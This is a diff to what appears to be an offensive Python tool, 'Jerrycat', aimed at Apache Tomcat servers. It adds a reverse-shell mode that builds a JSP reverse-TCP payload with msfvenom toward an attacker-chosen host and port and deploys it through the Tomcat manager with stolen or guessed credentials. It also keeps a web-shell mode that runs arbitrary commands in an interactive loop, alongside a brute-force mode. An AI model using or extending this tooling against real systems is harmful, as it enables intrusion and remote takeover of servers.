@@ -195,31 +195,47 @@ class authenticated_attack(tomcat):
 
     def upload(self):
 
-        response = requests.get(url=f"{self.url}/web_shell/index.jsp")
+        match args.mode:
+            case "exec":
+                response = requests.get(url=f"{self.url}/web_shell/index.jsp")
 
-        if response.status_code != 200:
-            command = f'curl --upload-file webshell/web_shell.war -u "{self.username}:{self.password}" "{self.url}/manager/text/deploy?path=/web_shell"'
-            subprocess.run(command, shell=True, check=True)
+                if response.status_code != 200:
+                    command = f'curl --upload-file webshell/web_shell.war -u "{self.username}:{self.password}" "{self.url}/manager/text/deploy?path=/web_shell"'
+                    subprocess.run(command, shell=True, check=True)
 
-        response = self.execute_webshell_cmd(cmd="whoami")
+                response = self.execute_webshell_cmd(cmd="whoami")
 
-        if response:
-            output.message(state="ongoing", description="Spawning webshell...", clear_before=False)
-        else:
-            output.message(state="failed", description="An error occur with the webshell", clear_before=False)
-            output.message(state="exit", description="Jobs finished ? Jobs not finished", clear_before=False)
-            return
+                if response:
+                    output.message(state="ongoing", description="Spawning webshell...", clear_before=False)
+                else:
+                    output.message(state="failed", description="An error occur with the webshell", clear_before=False)
+                    output.message(state="exit", description="Jobs finished ? Jobs not finished", clear_before=False)
+                    return
 
-        cmd = ''
+                cmd = ''
 
-        while cmd != "exit":
-            print("[bold red]Jerrycat[/] > ", end="")
-            cmd = input()
+                while cmd != "exit":
+                    print("[bold red]Jerrycat[/] > ", end="")
+                    cmd = input()
 
-            if cmd != "":
-                response = self.execute_webshell_cmd(cmd=cmd)
-                if response != "":
-                    print(response)
+                    if cmd != "":
+                        response = self.execute_webshell_cmd(cmd=cmd)
+                        if response != "":
+                            print(response)
+
+            case "reverse":
+                response = requests.get(url=f"{self.url}/reverse_shell/index.jsp")
+
+                output.message(state="info", description=f"LPORT: {args.lport}", clear_before=False)
+                output.message(state="info", description=f"LHOST: {args.lhost}", clear_before=False)
+
+                if response.status_code != 200:
+                    subprocess.run(
+                        ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={args.lhost}", f"LPORT={args.lport}", "-f", "raw",
+                         "-o", "jerry.jsp"], check=True)
+
+                    command = f'curl --upload-file webshell/reverse_shell.war -u "{self.username}:{self.password}" "{self.url}/manager/text/deploy?path=/reverse_shell"'
+                    subprocess.run(command, shell=True, check=True)
 
     def execute_webshell_cmd(self, cmd: str):
         response = requests.get(f"{self.url}/web_shell/index.jsp?cmd={cmd}")
@@ -233,7 +249,8 @@ def main():
     global output, args
 
     # listen for CTRL+C
-    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(output.message(state="exit", description="See you next time!", clear_before=True)))
+    signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(
+        output.message(state="exit", description="See you next time!", clear_before=True)))
 
     parser = argparse.ArgumentParser(description="jerrycat the good guy !")
 
@@ -260,6 +277,8 @@ def main():
 
     # reverse shell mode - no specific option yet
     reverse_mode = parser.add_argument_group("reverse shell Options")
+    parser.add_argument('--lhost', dest='lhost', help='LHOST for reverse shell')
+    parser.add_argument('--lport', dest='lport', help='LPORT for reverse shell')
 
     args = parser.parse_args()
 
@@ -280,7 +299,7 @@ def main():
         # settings for brute mode
         case 'brute':
             if not all([args.url, args.wordlist]):
-                parser.error(" -u and -w arguments are requires for this mode.")
+                parser.error(" url and -w arguments are requires for this mode.")
             else:
                 output.message("success", "Mode Brute selected", False)
 
@@ -301,10 +320,13 @@ def main():
 
         # settings for reverse mode
         case 'reverse':
-            if not all([args.url, args.user, args.password, args.reverse]):
-                parser.error("-u, -U, -p arguments are requires for this mode.")
+            if not all([args.url, args.user, args.password, args.lhost, args.lport]):
+                parser.error("-u, -p, lhost, lport arguments are requires for this mode.")
             else:
-                print("Reverse shell mode selected")
+                output.message("success", "Mode Reverse shell selected", False)
+                revereshell = authenticated_attack(url=args.url, username=args.user, password=args.password)
+                revereshell.login(username=args.user, password=args.password)
+                revereshell.upload()
 
 
 if __name__ == "__main__":
